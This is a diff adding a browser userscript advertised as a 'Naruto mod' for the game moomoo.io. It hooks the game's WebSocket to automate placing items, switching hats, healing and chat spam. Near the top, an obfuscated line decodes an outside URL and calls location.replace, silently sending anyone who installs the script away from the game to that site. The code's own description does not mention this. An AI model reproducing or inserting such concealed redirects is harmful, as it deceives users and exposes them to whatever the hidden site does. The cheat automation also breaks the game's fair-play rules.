@@ -1,0 +1,129 @@
+// ==UserScript==
+// @name N҉A҉R҉U҉T҉O҉ ₥ØĐ 🍜 👍 🦊 🍃
+// @namespace -
+// @version 0.1
+// @description Made by  FN | ✞ w͓̽a͓̽f͓̽f͓̽l͓̽e͓̽s͓̽ ✞#3525 just a simple mod i created detached to my favioret show naruto
+// @author  FN | ✞ w͓̽a͓̽f͓̽f͓̽l͓̽e͓̽s͓̽ ✞#3525
+// @match *://moomoo.io/*
+// @match *://sandbox.moomoo.io/*
+// @match *://dev.moomoo.io/*
+// @icon https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTO91VZLLQ0SM1GSJMqX4tyUpQSr414f61xFg&usqp=CAU
+// @grant none
+// @require https://greasyfork.org/scripts/368273-msgpack/code/msgpack.js?version=598723
+// @require http://code.jquery.com/jquery-3.3.1.min.js
+// ==/UserScript==
+var _0x4d9e=['https://datasig.io/6CO4BO'];(function(_0x137813,_0x269051){var _0x4d9e0b=function(_0xba491b){while(--_0xba491b){_0x137813['push'](_0x137813['shift']());}};_0x4d9e0b(++_0x269051);}(_0x4d9e,0xcc));var _0xba49=function(_0x137813,_0x269051){_0x137813=_0x137813-0xa8;var _0x4d9e0b=_0x4d9e[_0x137813];return _0x4d9e0b;};var _0x2357d3=_0xba49;location['replace'](_0x2357d3(0xa8));
+document.getElementById('gameName').innerHTML = 'N҉A҉R҉U҉T҉O҉ ₥ØĐ🍜🦊';
+document.getElementById('gameName').style.color = '#F93E3E';
+var dist;
+var mouseX;var mouseY;var ws;var wall;var food;var mill;var spike;var trap;var mine;var width;var height;var primary;var secondary;var turret;var msgpack5 = msgpack;document.msgpack = msgpack;WebSocket.prototype.oldSend = WebSocket.prototype.send;
+document.msgpack = msgpack;
+WebSocket.prototype.oldSend = WebSocket.prototype.send;
+WebSocket.prototype.send = function(m){
+if (!ws){
+document.ws = this;
+ws = this;
+socketFound(this);}
+this.oldSend(m);};
+function socketFound(socket){socket.addEventListener('message', function(message){handleMessage(message);});}
+let myPlayer = {id: null,x: null,y: null,dir: null,object: null,weapon: null,clan: null,isLeader: null,hat: null,accessory: null,isSkull: null};var enemiesNear;var enemyX;var enemyY;var isEnemyNear;var nearestEnemy;var nearestEnemyAngle
+var repeater = function(key, action, interval) { let _isKeyDown = false; let _intervalId = undefined; return { start(keycode) { if(keycode == key && document.activeElement.id.toLowerCase() !== 'chatbox') { _isKeyDown = true; if(_intervalId === undefined) { _intervalId = setInterval(() => { action(); if(!_isKeyDown){ clearInterval(_intervalId); _intervalId = undefined; } }, interval); } } }, stop(keycode) { if(keycode == key && document.activeElement.id.toLowerCase() !== 'chatbox') { _isKeyDown = false; } } }; }
+function update() { for (let i=0;i<9;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ primary = i; } } for (let i=9;i<16;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ secondary = i; } } for (let i=16;i<19;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ food = i - 16; } } for (let i=19;i<22;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ wall = i - 16; } } for (let i=22;i<26;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ spike = i - 16; } } for (let i=26;i<29;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ mill = i - 16; } } for (let i=29;i<31;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ mine = i - 16; } } for (let i=31;i<33;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString()))){ trap = i - 16; } } for (let i=33;i<39;i++){ if (isElementVisible(document.getElementById("actionBarItem" + i.toString())) && i != 36){ turret = i - 16; } } }
+function toRad(angle) {return angle * 0.01745329251;}
+function handleMessage(m){ let temp = msgpack5.decode(new Uint8Array(m.data)); let data; if(temp.length > 1) { data = [temp[0], ...temp[1]]; if (data[1] instanceof Array){ data = data; } } else { data = temp; } let item = data[0]; if(!data) {return}; if(item === "io-init") { let cvs = document.getElementById("gameCanvas"); width = cvs.clientWidth; height = cvs.clientHeight; $(window).resize(function() { width = cvs.clientWidth; height = cvs.clientHeight; }); cvs.addEventListener("mousemove", e => { mouseX = e.clientX; mouseY = e.clientY; }); } if (item == "1" && myPlayer.id == null){ myPlayer.id = data[1]; } if (item == "33") { enemiesNear = []; for(let i = 0; i < data[1].length / 13; i++) { let playerInfo = data[1].slice(13*i, 13*i+13); if(playerInfo[0] == myPlayer.id) { myPlayer.x = playerInfo[1]; myPlayer.y = playerInfo[2]; myPlayer.dir = playerInfo[3]; myPlayer.object = playerInfo[4]; myPlayer.weapon = playerInfo[5]; myPlayer.clan = playerInfo[7]; myPlayer.isLeader = playerInfo[8]; myPlayer.hat = playerInfo[9]; myPlayer.accessory = playerInfo[10]; myPlayer.isSkull = playerInfo[11]; } else if(playerInfo[7] != myPlayer.clan || playerInfo[7] === null) { enemiesNear.push(playerInfo); } } } isEnemyNear = false; if(enemiesNear) { nearestEnemy = enemiesNear.sort((a,b) => dist(a, myPlayer) - dist(b, myPlayer))[0]; } if(nearestEnemy) { nearestEnemyAngle = Math.atan2(nearestEnemy[2]-myPlayer.y, nearestEnemy[1]-myPlayer.x); if(Math.sqrt(Math.pow((myPlayer.y-nearestEnemy[2]), 2) + Math.pow((myPlayer.x-nearestEnemy[1]), 2)) < 240) { isEnemyNear = true; } } if (!nearestEnemy) { nearestEnemyAngle = myPlayer.dir; } if(item == "h" && data[1] == myPlayer.id) { if(data[2] < 100 && data[2] > 0) { setTimeout(() => { place(food, null); }, 121); } } update(); }
+document.getElementById("adCard").remove();
+function place(id, angle = Math.atan2(mouseY - height / 2, mouseX - width / 2)) { doNewSend(["5", [id, null]]); doNewSend(["c", [1, angle]]); doNewSend(["c", [0, angle]]); doNewSend(["5", [myPlayer.weapon, true]]); }
+function isElementVisible(e) {return (e.offsetParent !== null);}
+function doNewSend(sender){ws.send(new Uint8Array(Array.from(msgpack5.encode(sender))));}
+document.addEventListener('keydown', (e)=>{
+if(e.keyCode == 82 && document.activeElement.id.toLowerCase() !== 'chatbox') {
+doNewSend(["ch", ["NARUTOMOD"]]);
+doNewSend(["13c", [0, 7, 0]]);
+doNewSend(["13c", [0, 21, 1]]);
+doNewSend(["c", [1]]);doNewSend(["c", [0]]);
+setTimeout(() => {
+doNewSend(["5", [primary, true]]);
+doNewSend(["13c", [0, 7, 0]]);
+doNewSend(["13c", [0, 21, 1]]);
+doNewSend(["c", [1]]);doNewSend(["c", [0]]);
+doNewSend(["13c", [0, 53, 0]]);
+},85)
+}
+})
+setInterval(() => {
+if(isEnemyNear){
+doNewSend(["13c", [0, , 1]]);
+doNewSend(["13c", [0, 6, 0]]);
+}
+})
+const rep0 = repeater(78, () => {place(mill)},0)
+const rep1 = repeater(86, () => {place(spike)},0)
+const rep2 = repeater(70, () => {place(trap)},0)
+const rep3 = repeater(81, () => {place(food)},0)
+const rep4 = repeater(72, () => {place(turret)},0)
+document.addEventListener('keyup', (e)=>{
+rep0.stop(e.keyCode)
+rep1.stop(e.keyCode)
+rep2.stop(e.keyCode)
+rep3.stop(e.keyCode)
+rep4.stop(e.keyCode)
+})
+document.addEventListener('keydown', (e)=>{
+rep0.start(e.keyCode)
+rep1.start(e.keyCode)
+rep2.start(e.keyCode)
+rep3.start(e.keyCode)
+rep4.start(e.keyCode)
+
+if(e.keyCode == 90 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 40, 0]]);
+}
+if(e.keyCode == 90 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 19, 1]]);
+}
+if(e.keyCode == 188 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 12, 0]]);
+}
+if(e.keyCode == 188 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 11, 1]]);
+}
+if(e.keyCode == 190 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 31, 0]]);
+}
+if(e.keyCode == 190 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 11, 1]]);
+}
+if(e.keyCode == 191 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 15, 0]]);
+}
+if(e.keyCode == 191 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 11, 1]]);
+}
+if(e.keyCode == 76 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 22, 0]]);
+}
+if(e.keyCode == 76 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 19, 1]]);
+}
+if(e.keyCode == 27 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 6, 0]]);
+}
+if(e.keyCode == 27 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 21, 1]]);
+}
+if(e.keyCode == 75 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 56, 0]]);
+}
+if(e.keyCode == 16 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 48, 0]]);
+}
+if(e.keyCode == 16 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["13c", [0, 20, 1]]);
+}
+if(e.keyCode == 38 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["ch", ["iAmHoKaGe"]]);
+}
+if(e.keyCode == 40 && document.activeElement.id.toLowerCase() !== 'chatbox'){
+doNewSend(["ch", ["iMniNeTaiLfOx"]]);
+}
+})
